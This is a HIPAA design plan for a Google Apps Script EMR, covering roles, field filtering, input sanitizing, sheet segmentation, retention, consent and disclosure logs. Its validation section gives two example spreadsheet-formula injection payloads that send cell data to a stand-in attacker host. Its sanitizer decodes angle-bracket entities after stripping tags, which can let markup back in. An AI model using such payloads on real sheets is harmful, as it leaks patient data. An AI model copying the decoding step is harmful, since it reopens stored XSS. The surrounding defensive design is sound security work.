# EMR GAS Application Layer Plan — HIPAA Data Access & Business Logic

**Created:** 2026-03-15
**Status:** Ready for implementation
**Scope:** `testauthgas1.gs` (and future GAS application files)
**Prerequisites:** Plan 10 (EMR Security Hardening — all 8 phases) fully implemented
**Layer:** This plan covers **Layer 2 (Data Access Control)** and **Layer 3 (EMR Application Features)** — building on top of the auth & session security foundation established by Plan 10.
**References:**
- [10-EMR-SECURITY-HARDENING-PLAN.md](10-EMR-SECURITY-HARDENING-PLAN.md) — Auth layer security (Layer 1)
- [06-UNIFIED-TOGGLEABLE-AUTH-PATTERN.md](06-UNIFIED-TOGGLEABLE-AUTH-PATTERN.md) — Auth preset system
- HIPAA Security Rule — 45 CFR § 164.312 (Technical Safeguards)
- HIPAA Privacy Rule — 45 CFR § 164.502(b) (Minimum Necessary)
- HIPAA Privacy Rule — 45 CFR § 164.508 (Uses and Disclosures for Which an Authorization Is Required)
- HIPAA Privacy Rule — 45 CFR § 164.530(j) (Retention Requirements)
- NIST SP 800-66 — Implementing the HIPAA Security Rule

---

## Why This Plan Exists

Plan 10 secures the **front door** — authentication, session management, audit logging infrastructure, and browser-level PHI protection. But a secure front door doesn't help if the rooms inside have no locks.

This plan secures **what happens after sign-in** — how data is accessed, who can see what, how inputs are validated, how long data is kept, and how patient consent is tracked. Every feature in this plan lives in the GAS layer (server-side) because that's where data operations execute and where trust is enforced.

### Architecture Context

```
┌─────────────────────────────────────────────┐
│  Layer 3: EMR Application Features          │  ← Phases 5–7
│  (Consent tracking, retention, reporting)   │     (this plan)
├─────────────────────────────────────────────┤
│  Layer 2: Data Access Control               │  ← Phases 1–4
│  (RBAC, minimum necessary, validation,     │     (this plan)
│   input sanitization, PHI segmentation)     │
├─────────────────────────────────────────────┤
│  Layer 1: Auth & Session Security           │  ← Plan 10
│  (HMAC, lockout, DOM clear, session         │     (complete or
│   validation, audit logging)                │     in progress)
├─────────────────────────────────────────────┤
│  Layer 0: Platform Security                 │  ← Google
│  (Google Workspace BAA, TLS, encryption     │     (handled by
│   at rest)                                  │     platform)
└─────────────────────────────────────────────┘
```

### How This Plan Connects to Plan 10

| Plan 10 Foundation | This Plan Builds On It |
|-------------------|----------------------|
| `validateSessionForData(token, op)` — validates session before data ops | Every data function in this plan calls it first (already required) |
| `dataAuditLog(user, action, type, id, details)` — per-operation audit logging | Every data function logs its access with role, minimum-necessary context, and consent status |
| `AUTH_CONFIG` toggle system — preset-gated features | New toggles follow the same pattern: `false` in `standard`, `true` in `hipaa` |
| Session data includes `email`, `displayName`, `isEmergencyAccess` | Extended to include `role`, `department`, `permissions` after RBAC lookup |

---

## Implementation Phases

### Phase 1: Role-Based Access Control (RBAC)

**Risk:** Medium (new authorization layer on every data operation)
**Files:** `testauthgas1.gs`, new `Roles` and `Permissions` sheets
**HIPAA:** 45 CFR § 164.312(a)(1) Access Control — "allow access only to those persons or software programs that have been granted access rights"

**What:** The current system is binary — you're either authorized (in the ACL) or not. An EMR needs granular roles: a nurse can view vitals but not psychiatric notes, a billing clerk sees insurance info but not diagnoses, an admin manages users but doesn't see patient data.

**New config toggles:**
```javascript
// standard preset:
ENABLE_RBAC: false,                    // Binary access control (current behavior)
ROLES_SHEET_NAME: 'Roles',             // Sheet storing email → role mappings
PERMISSIONS_SHEET_NAME: 'Permissions', // Sheet storing role → resource → actions mappings

// hipaa preset:
ENABLE_RBAC: true,                     // Role-based access control on every data operation
ROLES_SHEET_NAME: 'Roles',
PERMISSIONS_SHEET_NAME: 'Permissions',
```

**Spreadsheet structure:**

`Roles` sheet:
| Email | Role | Department | Active | Added | AddedBy |
|-------|------|-----------|--------|-------|---------|
| nurse@hospital.com | nurse | Cardiology | TRUE | 2026-01-15 | admin@hospital.com |
| dr.smith@hospital.com | physician | Cardiology | TRUE | 2026-01-10 | admin@hospital.com |
| billing@hospital.com | billing | Administration | TRUE | 2026-01-12 | admin@hospital.com |
| admin@hospital.com | admin | IT | TRUE | 2026-01-01 | system |

`Permissions` sheet:
| Role | ResourceType | AllowedActions | FieldRestrictions |
|------|-------------|----------------|-------------------|
| physician | patient_record | read,write,update,delete | * |
| physician | psychiatric_notes | read,write,update | * |
| nurse | patient_record | read,write,update | name,dob,vitals,medications,allergies |
| nurse | psychiatric_notes | — | — |
| billing | patient_record | read | name,dob,insurance,billingCodes |
| billing | psychiatric_notes | — | — |
| admin | user_management | read,write,update,delete | * |
| admin | patient_record | — | — |

**Core function — `getUserRole()`:**
```javascript
function getUserRole(email) {
  if (!AUTH_CONFIG.ENABLE_RBAC) {
    return { role: 'unrestricted', department: '', permissions: {} };
  }

  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var rolesSheet = ss.getSheetByName(AUTH_CONFIG.ROLES_SHEET_NAME);
  if (!rolesSheet) {
    auditLog('security_alert', email, 'roles_sheet_missing',
      { sheet: AUTH_CONFIG.ROLES_SHEET_NAME });
    throw new Error('RBAC_NOT_CONFIGURED');
  }

  var data = rolesSheet.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) {
    if (data[i][0].toString().toLowerCase() === email.toLowerCase() && data[i][3] === true) {
      var role = data[i][1].toString();
      var department = data[i][2].toString();
      var permissions = loadPermissionsForRole(role);
      return { role: role, department: department, permissions: permissions };
    }
  }

  auditLog('security_alert', email, 'no_role_assigned',
    { reason: 'User authenticated but has no role in Roles sheet' });
  throw new Error('NO_ROLE_ASSIGNED');
}
```

**Core function — `checkPermission()`:**
```javascript
function checkPermission(userRole, resourceType, action) {
  if (!AUTH_CONFIG.ENABLE_RBAC) return { allowed: true, fields: '*' };

  var perms = userRole.permissions[resourceType];
  if (!perms) {
    return { allowed: false, fields: [], reason: 'no_access_to_resource' };
  }

  var allowedActions = perms.actions.split(',');
  if (allowedActions.indexOf(action) === -1) {
    return { allowed: false, fields: [], reason: 'action_not_permitted' };
  }

  return { allowed: true, fields: perms.fields };
}
```

**Integration with `validateSessionForData()`:**

Extend the return value of `validateSessionForData()` to include the user's role:
```javascript
// After session validation succeeds:
var role = getUserRole(sessionData.email);
return {
  email: sessionData.email,
  displayName: sessionData.displayName,
  role: role,
  isEmergencyAccess: !!sessionData.isEmergencyAccess
};
```

**Design decisions:**

1. **Spreadsheet-based roles, not code-based** — roles and permissions live in Google Sheets, not in `AUTH_CONFIG`. This allows administrators to add/remove roles and adjust permissions without code changes or redeployment. The Sheets are BAA-covered, auditable, and accessible via the Google Sheets UI.

2. **Fail-closed on missing role** — if a user passes authentication but has no role assignment, access is denied. This prevents the gap where someone is in the ACL (can sign in) but hasn't been assigned a role (shouldn't see any data yet).

3. **Emergency access overrides RBAC** — break-glass sessions (Plan 10, Phase 5) bypass role restrictions. The `isEmergencyAccess` flag from the session data grants full access regardless of role. This is logged distinctly and reviewed during audits.

4. **Role caching** — `getUserRole()` reads from Sheets on every call. For performance, consider caching the result in CacheService for the duration of the session (keyed by email). Role changes would take effect on the next session, not mid-session — this is acceptable for HIPAA (role changes are administrative events, not real-time).

---

### Phase 2: Minimum Necessary Access

**Risk:** Medium (changes data return structure for all data operations)
**Files:** `testauthgas1.gs`
**HIPAA:** 45 CFR § 164.502(b) — "when using or disclosing protected health information... a covered entity must make reasonable efforts to limit protected health information to the minimum necessary to accomplish the intended purpose"

**What:** Every data query function must filter its return data to include only the fields the user's role permits. A nurse asking for a patient record gets `{name, dob, vitals, medications}` — not the full record with psychiatric notes and billing codes.

**New config toggle:**
```javascript
// standard preset:
ENABLE_MINIMUM_NECESSARY: false,  // Return all fields (current behavior)

// hipaa preset:
ENABLE_MINIMUM_NECESSARY: true,   // Filter returned fields by role permissions
```

**Core function — `filterByPermission()`:**
```javascript
function filterByPermission(record, allowedFields, resourceType) {
  if (!AUTH_CONFIG.ENABLE_MINIMUM_NECESSARY) return record;
  if (allowedFields === '*') return record;

  var fieldList = allowedFields.split(',');
  var filtered = {};
  for (var i = 0; i < fieldList.length; i++) {
    var field = fieldList[i].trim();
    if (record.hasOwnProperty(field)) {
      filtered[field] = record[field];
    }
  }
  return filtered;
}
```

**Usage in data operations:**
```javascript
function getPatientRecord(sessionToken, patientId) {
  var user = validateSessionForData(sessionToken, 'getPatientRecord');

  var perm = checkPermission(user.role, 'patient_record', 'read');
  if (!perm.allowed) {
    auditLog('security_alert', user.email, 'access_denied',
      { operation: 'getPatientRecord', role: user.role.role, reason: perm.reason });
    throw new Error('ACCESS_DENIED');
  }

  var record = readPatientFromSheet(patientId);  // Returns full record
  var filtered = filterByPermission(record, perm.fields, 'patient_record');

  dataAuditLog(user, 'read', 'patient_record', patientId, {
    sessionId: sessionToken,
    role: user.role.role,
    fieldsReturned: Object.keys(filtered),
    isEmergencyAccess: user.isEmergencyAccess
  });

  return { success: true, data: filtered };
}
```

**Design decisions:**

1. **Server-side filtering only** — the filtering happens in GAS before the data is sent to the iframe. The client never receives fields it shouldn't see. This is fundamentally different from hiding columns in a UI — the data physically never leaves the server.

2. **Audit log includes `fieldsReturned`** — every data access logs exactly which fields were returned. An auditor can verify that the minimum necessary principle is being followed: "Nurse accessed patient 12345 and received [name, dob, vitals, medications] — consistent with nurse role permissions."

3. **Wildcard `*` for unrestricted roles** — physicians and emergency access get `*` (all fields). This avoids maintaining an exhaustive field list for roles that need full access.

---

### Phase 3: Input Validation and Sanitization

**Risk:** High (touches all data write paths — must not break legitimate data)
**Files:** `testauthgas1.gs`
**HIPAA:** 45 CFR § 164.312(c)(1) Integrity — "protect ePHI from improper alteration or destruction"
**OWASP:** Injection prevention, stored XSS prevention

**What:** Every input from the GAS iframe must be validated and sanitized before writing to Sheets. This prevents: (a) stored XSS — malicious HTML/JS in a patient note that executes when another user views it, (b) formula injection — a cell value starting with `=` that executes as a Sheets formula, (c) data integrity — wrong types, overlong values, or malformed data corrupting the record.

**New config toggle:**
```javascript
// standard preset:
ENABLE_INPUT_VALIDATION: false,     // Accept inputs as-is (current behavior)

// hipaa preset:
ENABLE_INPUT_VALIDATION: true,      // Validate and sanitize all inputs before writing
```

**Core function — `validateInput()`:**
```javascript
function validateInput(value, fieldDef) {
  if (!AUTH_CONFIG.ENABLE_INPUT_VALIDATION) return { valid: true, sanitized: value };

  // Null/undefined check
  if (value === null || value === undefined) {
    if (fieldDef.required) {
      return { valid: false, reason: 'required_field_missing' };
    }
    return { valid: true, sanitized: '' };
  }

  var str = String(value);

  // Length check
  if (fieldDef.maxLength && str.length > fieldDef.maxLength) {
    return { valid: false, reason: 'exceeds_max_length', max: fieldDef.maxLength, actual: str.length };
  }

  // Type validation
  if (fieldDef.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str)) {
    return { valid: false, reason: 'invalid_email_format' };
  }
  if (fieldDef.type === 'date' && isNaN(Date.parse(str))) {
    return { valid: false, reason: 'invalid_date_format' };
  }
  if (fieldDef.type === 'number' && isNaN(Number(str))) {
    return { valid: false, reason: 'invalid_number' };
  }
  if (fieldDef.type === 'phone' && !/^[\d\s\-\+\(\)\.]+$/.test(str)) {
    return { valid: false, reason: 'invalid_phone_format' };
  }

  // Sanitization — prevent formula injection and stored XSS
  var sanitized = str;

  // Formula injection: prefix dangerous characters with a single quote
  // to prevent Sheets from interpreting them as formulas
  if (/^[=+\-@\t\r]/.test(sanitized)) {
    sanitized = "'" + sanitized;
  }

  // HTML/script removal for text fields
  if (fieldDef.type === 'text' || fieldDef.type === 'note') {
    sanitized = sanitized
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<[^>]+>/g, '')         // Strip all HTML tags
      .replace(/&lt;/g, '<')           // Decode common entities back for readability
      .replace(/&gt;/g, '>')
      .replace(/&amp;/g, '&');
  }

  // Pattern match validation (optional — for structured fields like MRN, SSN)
  if (fieldDef.pattern && !new RegExp(fieldDef.pattern).test(sanitized)) {
    return { valid: false, reason: 'pattern_mismatch', pattern: fieldDef.pattern };
  }

  return { valid: true, sanitized: sanitized };
}
```

**Field definition examples:**
```javascript
var PATIENT_FIELDS = {
  name:        { type: 'text', maxLength: 200, required: true },
  dob:         { type: 'date', required: true },
  mrn:         { type: 'text', maxLength: 20, pattern: '^[A-Z0-9\\-]+$' },
  phone:       { type: 'phone', maxLength: 20 },
  email:       { type: 'email', maxLength: 254 },
  ssn:         { type: 'text', maxLength: 11, pattern: '^\\d{3}-\\d{2}-\\d{4}$' },
  notes:       { type: 'note', maxLength: 5000 },
  diagnosis:   { type: 'text', maxLength: 1000 },
  medications: { type: 'text', maxLength: 2000 },
  allergies:   { type: 'text', maxLength: 1000 }
};
```

**Design decisions:**

1. **Formula injection is the #1 GAS-specific risk** — Google Sheets interprets cells starting with `=`, `+`, `-`, `@` as formulas. An attacker could inject `=IMPORTRANGE("attacker-sheet-id", "A1")` to exfiltrate data or `=IMAGE("https://attacker.com/log?data=" & A1)` to leak cell values via image URLs. The single-quote prefix (`'`) tells Sheets to treat the cell as text.

2. **HTML stripping, not encoding** — for text/note fields, HTML tags are stripped entirely rather than encoded. In an EMR context, there's no legitimate reason for HTML in patient notes. Stripping is safer than encoding because encoded HTML could still cause rendering issues if the display layer doesn't handle entities correctly.

3. **Validation happens server-side only** — client-side validation in the GAS iframe is a UX convenience (immediate feedback), not a security control. The GAS functions are the enforcement point. An attacker could bypass client-side validation by calling `google.script.run` directly with crafted inputs.

4. **Field definitions are code-level, not Sheets-level** — the `PATIENT_FIELDS` object defines validation rules in the GAS code. This is intentional: validation rules are a code concern (they define the data contract), not a data concern. Changing them requires a deployment, which creates an audit trail.

---

### Phase 4: PHI Segmentation in Google Sheets

**Risk:** Medium (changes spreadsheet structure — requires data migration if existing data)
**Files:** `testauthgas1.gs`, spreadsheet architecture
**HIPAA:** 45 CFR § 164.312(a)(1) Access Control — defense-in-depth for direct Sheets access

**What:** Structure spreadsheets so that direct identifiers (name, SSN, DOB) and clinical data (diagnoses, medications, notes) are in separate sheets, linked by an internal patient ID. If someone gains direct access to one sheet (via Google Sheets sharing, bypassing the app), they see either identifiers or clinical data — not both.

**Spreadsheet structure:**

`PatientDemographics` sheet (identifiers):
| InternalId | Name | DOB | SSN | Phone | Email | Address | InsuranceId |
|-----------|------|-----|-----|-------|-------|---------|------------|
| P-00001 | Jane Doe | 1985-03-15 | 123-45-6789 | 555-0100 | jane@email.com | 123 Main St | INS-789 |

`PatientClinical` sheet (clinical data — linked by InternalId):
| InternalId | Diagnosis | Medications | Allergies | Vitals | Notes |
|-----------|-----------|-------------|-----------|--------|-------|
| P-00001 | Hypertension | Lisinopril 10mg | Penicillin | BP 120/80 | Follow-up in 3 months |

`PatientPsych` sheet (restricted — linked by InternalId):
| InternalId | PsychDiagnosis | TherapyNotes | Medications | RiskAssessment |
|-----------|---------------|-------------|-------------|---------------|
| P-00001 | Major Depressive Disorder | Session notes... | Sertraline 50mg | Low |

**Core function — `getPatientRecord()` with segmentation:**
```javascript
function getPatientRecord(sessionToken, patientId) {
  var user = validateSessionForData(sessionToken, 'getPatientRecord');

  // Determine which sheets the user's role can access
  var perm = checkPermission(user.role, 'patient_record', 'read');
  if (!perm.allowed) throw new Error('ACCESS_DENIED');

  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var record = {};

  // Always fetch demographics (filtered by role permissions)
  var demoData = lookupByInternalId(ss, 'PatientDemographics', patientId);
  if (demoData) {
    record = filterByPermission(demoData, perm.fields, 'patient_record');
  }

  // Fetch clinical data if role permits
  var clinicalPerm = checkPermission(user.role, 'patient_clinical', 'read');
  if (clinicalPerm.allowed) {
    var clinicalData = lookupByInternalId(ss, 'PatientClinical', patientId);
    if (clinicalData) {
      var filteredClinical = filterByPermission(clinicalData, clinicalPerm.fields, 'patient_clinical');
      for (var key in filteredClinical) {
        record[key] = filteredClinical[key];
      }
    }
  }

  // Fetch psych data if role permits (restricted to psychiatrists)
  var psychPerm = checkPermission(user.role, 'psychiatric_notes', 'read');
  if (psychPerm.allowed) {
    var psychData = lookupByInternalId(ss, 'PatientPsych', patientId);
    if (psychData) {
      var filteredPsych = filterByPermission(psychData, psychPerm.fields, 'psychiatric_notes');
      for (var key in filteredPsych) {
        record[key] = filteredPsych[key];
      }
    }
  }

  dataAuditLog(user, 'read', 'patient_record', patientId, {
    sheetsAccessed: Object.keys(record).length > 0 ? ['demographics', 'clinical', 'psych'].filter(function(s) { /* track which were read */ }) : [],
    fieldsReturned: Object.keys(record),
    role: user.role.role
  });

  return { success: true, data: record };
}
```

**Design decisions:**

1. **InternalId, not SSN or Name** — the link between sheets is a system-generated ID (`P-00001`), not a real-world identifier. Even if someone sees the clinical sheet directly, `P-00001 | Hypertension` reveals nothing about the patient's identity without cross-referencing the demographics sheet.

2. **Psych notes are a separate sheet** — psychiatric records have additional protections under 42 CFR Part 2 (substance abuse) and many state laws. Separating them into their own sheet allows stricter access controls at both the application level (RBAC) and the Google Sheets sharing level (only share the psych sheet with authorized clinicians).

3. **Google Sheets sharing as defense-in-depth** — even though the app enforces RBAC, the underlying Sheets can also have sharing restrictions. The demographics sheet might be shared with HR; the clinical sheet only with clinical staff; the psych sheet only with psychiatrists. This provides protection even if someone bypasses the app and opens Sheets directly.

4. **Write operations go to the correct sheet** — when saving data, the GAS function determines which sheet to write to based on the field being updated. Updating a phone number goes to `PatientDemographics`; updating a diagnosis goes to `PatientClinical`. The RBAC check runs against the target sheet's resource type.

---

### Phase 5: Data Retention and Deletion

**Risk:** Medium (automated deletion of data — must be thoroughly tested)
**Files:** `testauthgas1.gs`, scheduled triggers
**HIPAA:** 45 CFR § 164.530(j) — "a covered entity must retain the documentation required by paragraph (j)(1) of this section for 6 years from the date of its creation or the date when it last was in effect, whichever is later"

**What:** Implement retention policies that automatically archive or flag records past their retention period, and provide a secure deletion mechanism that logs every deletion for compliance.

**New config toggles:**
```javascript
// standard preset:
ENABLE_DATA_RETENTION: false,             // No automated retention management
DATA_RETENTION_YEARS: 6,                  // HIPAA minimum retention period
RETENTION_ARCHIVE_SHEET: 'ArchivedData',  // Sheet for archived records

// hipaa preset:
ENABLE_DATA_RETENTION: true,
DATA_RETENTION_YEARS: 6,
RETENTION_ARCHIVE_SHEET: 'ArchivedData',
```

**Retention lifecycle:**

```
Active Record ──(retention period expires)──► Flagged for Review
     │                                              │
     │                                      Admin reviews
     │                                              │
     │                                   ┌──────────┴──────────┐
     │                                   │                     │
     │                              Extend retention     Archive/Delete
     │                              (reset timer)              │
     │                                              ┌──────────┴──────────┐
     │                                              │                     │
     │                                         Archive               Permanent Delete
     │                                   (move to archive       (remove from all sheets,
     │                                    sheet, retain          log deletion with full
     │                                    for compliance)        record snapshot)
     └──────────────────────────────────────────────────────────────────────┘
```

**Scheduled trigger — `checkRetentionPolicies()`:**
```javascript
// Run daily via GAS time-driven trigger (Edit → Triggers → Add Trigger)
function checkRetentionPolicies() {
  if (!AUTH_CONFIG.ENABLE_DATA_RETENTION) return;

  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var cutoff = new Date();
  cutoff.setFullYear(cutoff.getFullYear() - AUTH_CONFIG.DATA_RETENTION_YEARS);

  // Check each data sheet for records past retention
  var sheets = ['PatientDemographics', 'PatientClinical', 'PatientPsych'];
  var flagged = [];

  for (var s = 0; s < sheets.length; s++) {
    var sheet = ss.getSheetByName(sheets[s]);
    if (!sheet) continue;
    var data = sheet.getDataRange().getValues();
    var headers = data[0];
    var dateCol = headers.indexOf('LastModified');
    if (dateCol === -1) continue;

    for (var i = data.length - 1; i >= 1; i--) {
      var lastModified = new Date(data[i][dateCol]);
      if (lastModified < cutoff) {
        flagged.push({
          sheet: sheets[s],
          row: i + 1,
          internalId: data[i][0],
          lastModified: lastModified.toISOString()
        });
      }
    }
  }

  if (flagged.length > 0) {
    auditLog('retention', 'system', 'records_flagged_for_review',
      { count: flagged.length, cutoffDate: cutoff.toISOString() });
    // Notify administrator via email
    // MailApp.sendEmail(adminEmail, 'EMR Retention Review Required', ...);
  }
}
```

**Secure deletion function:**
```javascript
function deletePatientRecord(sessionToken, patientId, reason) {
  var user = validateSessionForData(sessionToken, 'deletePatientRecord');

  // Only admin role can delete records
  var perm = checkPermission(user.role, 'patient_record', 'delete');
  if (!perm.allowed) throw new Error('ACCESS_DENIED');

  // Snapshot the full record before deletion (for audit trail)
  var fullRecord = readFullPatientRecord(patientId);  // All sheets, all fields

  // Archive the snapshot
  var archiveSheet = getOrCreateSheet(AUTH_CONFIG.RETENTION_ARCHIVE_SHEET);
  archiveSheet.appendRow([
    new Date().toISOString(),
    patientId,
    user.email,
    reason,
    JSON.stringify(fullRecord)
  ]);

  // Delete from all data sheets
  deleteFromAllSheets(patientId);

  // Audit log — includes the full record snapshot hash for integrity verification
  var snapshotHash = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256,
    JSON.stringify(fullRecord)
  );
  dataAuditLog(user, 'delete', 'patient_record', patientId, {
    reason: reason,
    snapshotHash: Utilities.base64Encode(snapshotHash),
    fieldsDeleted: Object.keys(fullRecord),
    role: user.role.role
  });

  return { success: true };
}
```

**Design decisions:**

1. **Flag-and-review, not auto-delete** — records past retention are flagged for administrator review, not automatically deleted. HIPAA requires 6 years minimum, but state laws may require longer (some states mandate 10+ years for minors). An administrator must make the final call.

2. **Snapshot before deletion** — every deleted record is fully captured in the archive sheet before removal. The snapshot hash provides tamper-evidence: if the archive is modified after deletion, the hash won't match.

3. **Deletion requires admin role** — only users with the `admin` role can delete patient records. This is enforced by RBAC (Phase 1) — the `delete` action on `patient_record` is only granted to admin.

4. **Reason required** — every deletion must include a reason (e.g., "retention period expired", "patient requested deletion", "duplicate record"). This is part of the audit trail.

---

### Phase 6: Consent Tracking

**Risk:** Low (additive — new sheet and functions, doesn't modify existing data paths)
**Files:** `testauthgas1.gs`, new `Consent` sheet
**HIPAA:** 45 CFR § 164.508 — authorizations required for certain uses and disclosures of PHI

**What:** Track patient consent for data sharing, treatment authorizations, and PHI disclosures. Data operations that involve sharing PHI externally (referrals, insurance submissions, research) must verify consent before proceeding.

**Spreadsheet structure:**

`Consent` sheet:
| InternalId | ConsentType | Granted | GrantedDate | ExpiryDate | RevokedDate | RevokedBy | Notes |
|-----------|------------|---------|------------|-----------|------------|----------|-------|
| P-00001 | treatment | TRUE | 2026-01-15 | 2027-01-15 | | | Annual renewal |
| P-00001 | insurance_disclosure | TRUE | 2026-01-15 | 2027-01-15 | | | |
| P-00001 | research | FALSE | | | | | Patient declined |
| P-00002 | treatment | TRUE | 2026-02-01 | 2026-08-01 | 2026-03-10 | patient | Revoked by patient request |

**Core functions:**
```javascript
function checkConsent(patientId, consentType) {
  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var sheet = ss.getSheetByName('Consent');
  if (!sheet) return { hasConsent: false, reason: 'consent_sheet_missing' };

  var data = sheet.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) {
    if (data[i][0] === patientId && data[i][1] === consentType) {
      var granted = data[i][2] === true;
      var expiry = data[i][4] ? new Date(data[i][4]) : null;
      var revoked = data[i][5] ? new Date(data[i][5]) : null;

      if (revoked) return { hasConsent: false, reason: 'consent_revoked', revokedDate: revoked.toISOString() };
      if (!granted) return { hasConsent: false, reason: 'consent_not_granted' };
      if (expiry && expiry < new Date()) return { hasConsent: false, reason: 'consent_expired', expiryDate: expiry.toISOString() };

      return { hasConsent: true };
    }
  }

  return { hasConsent: false, reason: 'no_consent_record' };
}

function recordConsent(sessionToken, patientId, consentType, granted, expiryDate, notes) {
  var user = validateSessionForData(sessionToken, 'recordConsent');
  var perm = checkPermission(user.role, 'consent', 'write');
  if (!perm.allowed) throw new Error('ACCESS_DENIED');

  var validated = validateInput(notes, { type: 'note', maxLength: 1000 });
  if (!validated.valid) throw new Error('INVALID_INPUT: ' + validated.reason);

  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var sheet = getOrCreateSheet('Consent');
  sheet.appendRow([
    patientId, consentType, granted,
    new Date().toISOString(), expiryDate || '',
    '', '', validated.sanitized
  ]);

  dataAuditLog(user, 'write', 'consent', patientId, {
    consentType: consentType,
    granted: granted,
    role: user.role.role
  });

  return { success: true };
}
```

**Usage — consent check before data sharing:**
```javascript
function shareRecordWithInsurance(sessionToken, patientId, insurerId) {
  var user = validateSessionForData(sessionToken, 'shareRecordWithInsurance');

  // Check consent before sharing
  var consent = checkConsent(patientId, 'insurance_disclosure');
  if (!consent.hasConsent) {
    auditLog('security_alert', user.email, 'disclosure_blocked_no_consent',
      { patientId: patientId, consentType: 'insurance_disclosure', reason: consent.reason });
    throw new Error('CONSENT_REQUIRED');
  }

  // ... proceed with disclosure ...

  dataAuditLog(user, 'export', 'patient_record', patientId, {
    disclosureTo: insurerId,
    consentVerified: true,
    role: user.role.role
  });
}
```

**Design decisions:**

1. **Treatment consent is implicit at registration** — HIPAA allows treatment without explicit written consent in most cases (the "treatment, payment, and healthcare operations" exception under § 164.506). The consent sheet tracks it for documentation, but the absence of a treatment consent record doesn't block care delivery.

2. **Research and external disclosures require explicit consent** — sharing PHI for research, marketing, or with non-covered entities requires explicit patient authorization (§ 164.508). The `checkConsent()` gate enforces this.

3. **Revocation is immediate** — once a consent is revoked (`RevokedDate` set), all future operations requiring that consent type are blocked. Past operations are not retroactively invalidated — they were legal when they occurred.

4. **Consent expiry** — consents can have an expiry date (e.g., annual renewal). Expired consents are treated the same as no consent. The scheduled trigger from Phase 5 can also flag expiring consents for renewal.

---

### Phase 7: Disclosure Logging

**Risk:** Low (additive — extends existing audit log)
**Files:** `testauthgas1.gs`, new `DisclosureLog` sheet
**HIPAA:** 45 CFR § 164.528 — "an individual has a right to receive an accounting of disclosures of protected health information made by a covered entity"

**What:** HIPAA requires covered entities to track and provide an accounting of all PHI disclosures (with limited exceptions for treatment, payment, and healthcare operations). Patients have the right to request this accounting.

**Spreadsheet structure:**

`DisclosureLog` sheet:
| Timestamp | PatientId | DisclosedTo | Purpose | DataDisclosed | DisclosedBy | ConsentRef |
|-----------|----------|------------|---------|--------------|------------|-----------|
| 2026-03-15T10:30:00Z | P-00001 | BlueCross Insurance | Insurance claim | name,dob,diagnosis,billingCodes | billing@hospital.com | INS-CONSENT-001 |
| 2026-03-15T14:00:00Z | P-00002 | Dr. Jones (referral) | Specialist referral | name,dob,diagnosis,medications | dr.smith@hospital.com | TREATMENT |

**Core function:**
```javascript
function logDisclosure(user, patientId, disclosedTo, purpose, dataFields, consentRef) {
  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var sheet = getOrCreateSheet('DisclosureLog');
  sheet.appendRow([
    new Date().toISOString(),
    patientId,
    disclosedTo,
    purpose,
    dataFields.join(', '),
    user.email,
    consentRef || 'TREATMENT'  // TPO exception
  ]);
}

// Patient's right to access their disclosure accounting
function getDisclosureAccounting(sessionToken, patientId) {
  var user = validateSessionForData(sessionToken, 'getDisclosureAccounting');

  // Patient can request their own accounting; admin can request any
  // (In a full implementation, patient identity would be verified)
  var perm = checkPermission(user.role, 'disclosure_log', 'read');
  if (!perm.allowed) throw new Error('ACCESS_DENIED');

  var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  var sheet = ss.getSheetByName('DisclosureLog');
  if (!sheet) return { success: true, disclosures: [] };

  var data = sheet.getDataRange().getValues();
  var disclosures = [];
  for (var i = 1; i < data.length; i++) {
    if (data[i][1] === patientId) {
      disclosures.push({
        date: data[i][0],
        disclosedTo: data[i][2],
        purpose: data[i][3],
        dataDisclosed: data[i][4]
      });
    }
  }

  dataAuditLog(user, 'read', 'disclosure_log', patientId, {
    recordsReturned: disclosures.length,
    role: user.role.role
  });

  return { success: true, disclosures: disclosures };
}
```

**Design decisions:**

1. **Separate from the data audit log** — the disclosure log (§ 164.528) is patient-facing and must be producible on request. The data audit log (Plan 10, Phase 8) is internal and used for compliance monitoring. They serve different audiences and have different retention requirements.

2. **Treatment/payment/healthcare operations (TPO) exception** — disclosures for TPO purposes do not require patient authorization (§ 164.506) and are not required in the patient-facing accounting (§ 164.528(a)(1)). However, logging them anyway is best practice — use `consentRef: 'TREATMENT'` to mark TPO disclosures.

---

## Implementation Order

```
Phase 1 (RBAC) ──────────────────────► Foundation for all other phases
Phase 2 (Minimum Necessary) ────────► Requires Phase 1 (uses role permissions)
Phase 3 (Input Validation) ──────────► Can be implemented independently
Phase 4 (PHI Segmentation) ──────────► Requires Phase 1 (role-based sheet access)
Phase 5 (Data Retention) ───────────► Requires Phases 1, 4 (roles + segmented sheets)
Phase 6 (Consent Tracking) ──────────► Requires Phase 1 (role-gated consent management)
Phase 7 (Disclosure Logging) ────────► Requires Phases 1, 6 (roles + consent verification)
```

**Suggested implementation batches:**

1. **Batch 1 (Foundation):** Phase 1 (RBAC) + Phase 3 (Input Validation) — these are independent and enable everything else
2. **Batch 2 (Data Architecture):** Phase 2 (Minimum Necessary) + Phase 4 (PHI Segmentation) — restructure how data is stored and returned
3. **Batch 3 (Compliance):** Phases 5 + 6 + 7 (Retention, Consent, Disclosure) — compliance features that build on the foundation

---

## Preset Behavior Matrix

| Phase | Toggle(s) | `standard` Preset | `hipaa` Preset |
|-------|-----------|-------------------|----------------|
| **1 — RBAC** | `ENABLE_RBAC` | `false` — binary access (ACL only) | `true` — role-based access on every operation |
| **2 — Minimum Necessary** | `ENABLE_MINIMUM_NECESSARY` | `false` — return all fields | `true` — filter fields by role permissions |
| **3 — Input Validation** | `ENABLE_INPUT_VALIDATION` | `false` — accept inputs as-is | `true` — validate and sanitize all inputs |
| **4 — PHI Segmentation** | (architectural — no toggle) | Single-sheet structure | Multi-sheet segmented structure |
| **5 — Data Retention** | `ENABLE_DATA_RETENTION` | `false` — no retention management | `true` — automated retention flagging |
| **6 — Consent Tracking** | (always active when sheets exist) | No consent sheets → no consent checks | Consent sheets populated → checks enforced |
